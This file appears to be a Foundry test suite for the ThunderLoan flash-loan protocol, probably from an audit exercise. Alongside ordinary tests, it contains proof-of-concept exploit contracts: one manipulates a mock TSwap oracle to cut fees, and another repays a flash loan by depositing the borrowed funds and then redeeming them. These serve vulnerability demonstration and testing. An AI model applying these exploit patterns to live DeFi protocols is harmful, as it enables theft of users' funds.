// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BaseTest, ThunderLoan} from "./BaseTest.t.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";
import {MockFlashLoanReceiver} from "../mocks/MockFlashLoanReceiver.sol";
import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(
            address(thunderLoan.getAssetFromToken(tokenA)),
            address(assetToken)
        );
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(
            abi.encodeWithSelector(
                ThunderLoan.ThunderLoan__NotAllowedToken.selector,
                address(tokenA)
            )
        );
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        assertEq(
            mockFlashLoanReceiver.getBalanceDuring(),
            amountToBorrow + AMOUNT
        );
        assertEq(
            mockFlashLoanReceiver.getBalanceAfter(),
            AMOUNT - calculatedFee
        );
    }

    function testRedeemAferLoad() public setAllowedToken {
        // amount = bound(amount,1e18,3e18);
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 10e18);
        uint256 startingBal = tokenA.balanceOf(liquidityProvider);
        tokenA.approve(address(thunderLoan), 10e18);
        thunderLoan.deposit(tokenA, 2e18);
        vm.stopPrank();
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), 10e18);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, 1e18, "");
        vm.stopPrank();
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, 2e18);
        vm.stopPrank();
        uint256 endingBal = tokenA.balanceOf(liquidityProvider);
        assert(startingBal < endingBal);
        console.log("startingBal", startingBal);
        console.log("endingBal", endingBal);
    }

    function testOracleManipulationHappening() public {
        thunderLoan = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(thunderLoan), "");
        address liquidator = makeAddr("liquidator");
        ERC20Mock weth = new ERC20Mock();
        ERC20Mock tokenA = new ERC20Mock();
        BuffMockPoolFactory poolFactory = new BuffMockPoolFactory(
            address(weth)
        );
        poolFactory.createPool(address(tokenA));
        address pool = poolFactory.getPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize((address(poolFactory)));

        vm.startPrank(liquidator);
        weth.mint(liquidator, 110e18);
        tokenA.mint(liquidator, 110e18);
        weth.approve(address(pool), 110e18);
        tokenA.approve(address(pool), 110e18);
        BuffMockTSwap(pool).deposit(
            100e18,
            100e18,
            100e18,
            uint64(block.timestamp)
        );
        vm.stopPrank();

        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken((tokenA), true);

        address thunderLiquidator = makeAddr("thunderLiquidator");
        vm.startPrank(thunderLiquidator);
        tokenA.mint(thunderLiquidator, 110e18);
        tokenA.approve(address(thunderLoan), 110e18);
        thunderLoan.deposit((tokenA), 100e18);
        uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(
            tokenA,
            100e18
        );
        vm.stopPrank();
        console.log("calculatedFeeNormal: ", calculatedFeeNormal);

        MaliciousFlashLoanReceiver mali = new MaliciousFlashLoanReceiver(
            address(pool),
            address(thunderLoan),
            address(thunderLoan.getAssetFromToken(tokenA))
        );
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        tokenA.mint(address(mali),100e18);
        weth.mint(attacker, 10e18);
        tokenA.mint(attacker, 10e18);
        thunderLoan.flashloan(address(mali), tokenA, 50e18, "");
        vm.stopPrank();
        uint256 endingtotalFees = mali.feeOne() + mali.feeTwo();
        console.log("endingtotalFees",endingtotalFees);
        assert(endingtotalFees < calculatedFeeNormal);
    }

    function testUseDepositInsteadToRepayFunds() public setAllowedToken hasDeposits{
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        uint256 amountToBorrow = 50e18;
        vm.startPrank(user);
        tokenA.mint(address(dor),1e18);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();
        assert(tokenA.balanceOf(address(dor)) > amountToBorrow);
    }

}


contract DepositOverRepay is IFlashLoanReceiver {

    IERC20 s_token;
    ThunderLoan thunderLoan;
    uint256 s_amount;

    constructor(address _thunderLoan) {
    thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address ,
        bytes calldata 
    ) external returns (bool){
        s_token = IERC20(token);
        s_amount = amount;
        IERC20(token).approve(address(thunderLoan),100e18);
        thunderLoan.deposit(s_token, amount+fee);
        return true;
    }

    function redeemMoney() external{
        thunderLoan.redeem(s_token, 49e18);
    }

}






contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    BuffMockTSwap tswap;
    ThunderLoan thunderLoan;
    address repayAddress;
    uint256 public feeOne;
    uint256 public feeTwo;

    bool attacked;

    constructor(
        address _tswapPool,
        address _thunderLoan,
        address _repayAddress
    ) {
        tswap = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 expected = tswap.getOutputAmountBasedOnInput(
                50e18,
                100e18,
                100e18
            );
            IERC20(token).approve(address(tswap), 50e18);
            tswap.swapPoolTokenForWethBasedOnInputPoolToken(
                50e18,
                expected,
                block.timestamp
            );
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            IERC20(token).transfer(address(repayAddress), amount + feeOne);
        } else {
            feeTwo = fee;
            IERC20(token).transfer(address(repayAddress), amount + feeOne);
        }
        return true;
    }

}


